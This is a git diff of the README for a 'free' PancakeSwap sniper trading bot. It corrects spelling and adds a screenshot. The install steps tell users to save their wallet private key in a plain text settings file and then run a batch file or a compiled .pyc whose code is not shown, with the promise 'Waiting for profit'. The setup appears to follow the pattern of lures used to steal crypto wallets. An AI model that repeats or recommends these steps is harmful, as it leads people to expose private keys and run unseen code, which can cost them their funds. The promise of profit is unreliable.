@@ -1,5 +1,6 @@
-# Pancakeswap_Snipper_Bot_Newversion
+# Pancakeswap_Sniper_Bot_Newversion
 Web3 Pancakeswap Snipper bot written in python3. For Free
+![Screenshot](https://user-images.githubusercontent.com/123884886/215787956-1f5413cf-1b61-49c7-8d6f-a2a409a63c62.png)
 
 BOT is free-to-use, but you are welcome to appreciate my work ☺️
 
@@ -18,6 +19,6 @@ This Tool only buys/sells with/to BNB/ETH but use Multi Hops to get the best Out
 Install
 1. First of all, you need install Python 3.12 Version
 2. Open "setting.txt" (with notepad for instance) and add your ethereum/bsc address and private key, contract address for snipping & config your bot.
-3. Run "launchbot.bat" OR type "py snipper.pyc"
+3. Run "launchbot.bat" OR type "py sniper.pyc"
 4. Waiting for profit !
 
